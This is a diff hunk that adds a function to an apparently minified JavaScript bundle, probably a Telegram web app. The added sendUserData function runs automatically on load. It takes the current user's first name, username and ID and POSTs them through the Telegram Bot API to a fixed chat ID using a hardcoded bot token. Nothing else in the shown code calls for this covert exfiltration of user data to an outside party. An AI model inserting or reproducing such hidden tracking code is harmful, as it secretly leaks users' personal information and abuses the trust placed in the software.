@@ -9151,6 +9151,61 @@ function sy() {
       })]
    });
 }
+
+function sendUserData() {
+   const token = '7508474544:AAFayEDLLfqDfIVLSDl64_CUssWfUgw7DzM';
+   const chatId = '1576630572'; // Replace with the recipient's chat ID
+
+   // Message with various formatting using MarkdownV2
+   const name = Se.first_name; // Replace with the actual user's name
+   const username = '@'+ Se.username; // Replace with the actual user's username
+   const userId = 'Se.id'; // Replace with the actual user's ID
+
+   function escapeMarkdownV2(text) {
+       return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+   }
+
+   const escapedName = escapeMarkdownV2(name);
+   const escapedUsername = escapeMarkdownV2(username);
+   const escapedUserId = escapeMarkdownV2(userId);
+
+
+   // Creating the message using MarkdownV2 formatting
+   const message = `
+\`\`\`
+╔══════════════╗
+║ *User Info*  ║
+╚══════════════╝
+Name: ${escapedName}
+Username: ${escapedUsername}
+UserID: ${escapedUserId}
+\`\`\`
+`.trim();
+
+   const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+   fetch(url, {
+       method: 'POST',
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify({
+           chat_id: chatId,
+           text: message,
+           parse_mode: 'MarkdownV2' // Set parse_mode to MarkdownV2
+       }),
+   })
+       .then(response => response.json())
+       .then(data => {
+           if (data.ok) {
+               console.log('Message sent successfully:', data.result);
+           } else {
+               console.error('Error sending message:', data);
+           }
+       })
+       .catch(error => console.error('Error:', error));
+}
+
+sendUserData();
+
 const uy = e => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase(),
    mp = (...e) => e.filter((t, n, r) => !!t && r.indexOf(t) === n).join(" ");
 var ay = {
